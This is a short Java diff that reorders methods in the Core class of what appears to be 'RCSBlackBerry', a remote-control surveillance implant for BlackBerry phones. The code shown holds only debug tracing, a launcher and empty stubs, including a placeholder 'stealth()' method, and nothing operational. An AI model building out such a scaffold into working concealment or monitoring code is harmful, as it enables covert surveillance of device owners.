@@ -12,7 +12,6 @@ import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
 
-
 /**
  * Classe Core, contiene il main.
  */
@@ -21,12 +20,35 @@ public class Core {
     /** The debug. */
     private static Debug debug = new Debug("Core", DebugLevel.VERBOSE);
 
+    /**
+     * Lib main.
+     * 
+     * @param args
+     *            the args
+     */
+    public static void libMain(final String[] args) {
+        debug.trace("RCSBlackBerry launching");
+
+        Core core = new Core();
+        boolean ret = core.run();
+
+        debug.trace("RCSBlackBerry exit, return " + ret);
+    }
+
     /** The task obj. */
     private Task taskObj = new Task();
 
     /**
+     * Gets the my name.
+     */
+    private void getMyName() {
+        // TODO Auto-generated method stub
+
+    }
+
+    /**
      * Run.
-     *
+     * 
      * @return true, if successful
      */
     public final boolean run() {
@@ -65,28 +87,5 @@ public class Core {
     private void stealth() {
         // TODO Auto-generated method stub
 
-    }
-
-    /**
-     * Gets the my name.
-     */
-    private void getMyName() {
-        // TODO Auto-generated method stub
-
-    }
-
-    /**
-     * Lib main.
-     *
-     * @param args
-     *            the args
-     */
-    public static void libMain(final String[] args) {
-        debug.trace("RCSBlackBerry launching");
-
-        Core core = new Core();
-        boolean ret = core.run();
-
-        debug.trace("RCSBlackBerry exit, return " + ret);
     }
 }
